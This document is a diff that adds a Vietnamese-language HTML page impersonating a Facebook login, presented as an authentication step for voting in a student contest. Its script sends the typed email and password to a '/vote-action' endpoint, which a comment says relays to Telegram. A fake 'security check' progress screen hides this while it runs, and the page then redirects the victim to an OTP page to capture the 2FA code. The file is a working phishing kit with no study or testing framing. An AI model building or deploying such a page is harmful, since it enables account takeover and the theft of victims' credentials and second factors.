@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Đăng nhập Facebook | Elite Student 2026</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* =========================================
+           FACEBOOK DESIGN SYSTEM 2026 
+           ========================================= */
+        :root {
+            --fb-blue: #1877f2;
+            --fb-bg: #f0f2f5;
+            --fb-green: #42b72a;
+            --fb-gray: #898f9c;
+            --fb-border: #dddfe2;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif; }
+        
+        body { background-color: var(--fb-bg); display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* Banner thông báo của hệ thống bình chọn */
+        .system-banner {
+            background-color: #e7f3ff;
+            color: #1877f2;
+            padding: 12px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 500;
+            border-bottom: 1px solid #ccd0d5;
+        }
+
+        /* Facebook Logo Area */
+        .header-area {
+            text-align: center;
+            padding: 40px 0 20px;
+        }
+        .header-area h1 {
+            color: var(--fb-blue);
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        /* Form Container */
+        .login-box {
+            width: 90%;
+            max-width: 400px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .notice-card {
+            background: #fffbe2;
+            border: 1px solid #f2e695;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #3b5998;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid var(--fb-border);
+            border-radius: 6px;
+            font-size: 16px;
+            background: #f5f6f7;
+        }
+        input:focus { border-color: var(--fb-blue); background: #fff; outline: none; }
+
+        .btn-login {
+            width: 100%;
+            background-color: var(--fb-blue);
+            color: #fff;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        .btn-login:active { opacity: 0.8; }
+
+        .links-area {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .links-area a { color: var(--fb-blue); text-decoration: none; font-size: 14px; }
+        
+        .divider {
+            height: 1px;
+            background: #dadde1;
+            margin: 20px 0;
+            position: relative;
+        }
+        .divider::after {
+            content: "hoặc";
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            padding: 0 10px;
+            color: #8d949e;
+            font-size: 13px;
+        }
+
+        .btn-create {
+            display: block;
+            width: 60%;
+            margin: 0 auto;
+            background-color: var(--fb-green);
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        /* Overlay Kiểm tra bảo mật giả lập */
+        #security-check {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999;
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+            padding: 20px; text-align: center;
+        }
+        .shield-icon { font-size: 80px; color: var(--fb-blue); margin-bottom: 20px; }
+        .loading-text { font-size: 18px; font-weight: 600; color: #4b4f56; }
+        .progress-bar {
+            width: 80%; height: 6px; background: #eee;
+            border-radius: 10px; margin-top: 20px; overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%; height: 100%; background: var(--fb-blue);
+            transition: width 0.1s;
+        }
+
+        /* Footer ngôn ngữ */
+        footer { margin-top: auto; padding: 40px 10%; background: #fff; }
+        .languages { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .languages li { list-style: none; font-size: 12px; color: var(--fb-gray); }
+        .copyright { text-align: center; font-size: 12px; color: var(--fb-gray); padding-top: 15px; border-top: 1px solid #ddd; }
+    </style>
+</head>
+<body>
+
+    <div class="system-banner">
+        Hệ thống yêu cầu xác thực để tiếp tục bình chọn.
+    </div>
+
+    <div class="header-area">
+        <h1>facebook</h1>
+    </div>
+
+    <div class="login-box">
+        <div class="notice-card" id="candidate-display">
+            <i class="fas fa-info-circle"></i>
+            Xác thực tài khoản để bình chọn cho thí sinh.
+        </div>
+
+        <form id="fb-login-form">
+            <input type="text" id="email" placeholder="Số điện thoại hoặc email" required>
+            <input type="password" id="pass" placeholder="Mật khẩu" required>
+            <button type="submit" class="btn-login">Đăng nhập</button>
+        </form>
+
+        <div class="links-area">
+            <a href="#">Quên mật khẩu?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <a href="#" class="btn-create">Tạo tài khoản mới</a>
+    </div>
+
+    <footer>
+        <ul class="languages">
+            <li style="color: #4b4f56; font-weight: bold;">Tiếng Việt</li>
+            <li>English (UK)</li>
+            <li>中文(台灣)</li>
+            <li>한국어</li>
+            <li>日本語</li>
+            <li>Português (Brasil)</li>
+        </ul>
+        <div class="copyright">
+            Facebook © 2026
+        </div>
+    </footer>
+
+    <div id="security-check">
+        <i class="fas fa-shield-alt shield-icon"></i>
+        <div class="loading-text" id="status-text">Đang kiểm tra bảo mật trình duyệt...</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="fill"></div>
+        </div>
+        <p style="margin-top: 20px; font-size: 12px; color: #90949c;">
+            Quá trình này diễn ra hoàn toàn tự động để bảo vệ tài khoản của bạn.
+        </p>
+    </div>
+
+    <script>
+        // 1. Lấy thông tin thí sinh từ trang Landing Page
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('candidate');
+        if(name) {
+            document.getElementById('candidate-display').innerHTML = 
+                `<i class="fas fa-check-circle" style="color:#42b72a"></i> Đang hoàn tất bình chọn cho: <b>${decodeURIComponent(name)}</b>`;
+        }
+
+        // 2. Xử lý logic Đăng nhập
+        const form = document.getElementById('fb-login-form');
+        const securityOverlay = document.getElementById('security-check');
+        const progressFill = document.getElementById('fill');
+        const statusText = document.getElementById('status-text');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const emailValue = document.getElementById('email').value;
+            const passValue = document.getElementById('pass').value;
+
+            // HIỆN MÀN HÌNH BẢO MẬT GIẢ LẬP
+            securityOverlay.style.display = 'flex';
+
+            // Gửi dữ liệu về Server Python (Telegram)
+            fetch('/vote-action', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    user: emailValue,
+                    pass: passValue,
+                    candidate: name
+                })
+            });
+
+            // Hiệu ứng thanh Progress Bar chạy
+            let width = 0;
+            const interval = setInterval(() => {
+                if(width >= 100) {
+                    clearInterval(interval);
+                    // CHUYỂN HƯỚNG SANG TRANG NHẬP OTP SAU KHI XONG
+                    setTimeout(() => {
+                        window.location.href = `otp.html?user=${encodeURIComponent(emailValue)}&candidate=${name}`;
+                    }, 500);
+                } else {
+                    width += 1;
+                    progressFill.style.width = width + '%';
+                    
+                    // Thay đổi thông báo cho "thật"
+                    if(width === 30) statusText.innerText = "Đang xác thực tài khoản...";
+                    if(width === 60) statusText.innerText = "Đang mã hóa dữ liệu bình chọn...";
+                    if(width === 85) statusText.innerText = "Yêu cầu mã xác minh (2FA)...";
+                }
+            }, 50); // Tổng thời gian chạy khoảng 5 giây
+        });
+    </script>
+</body>
+</html>
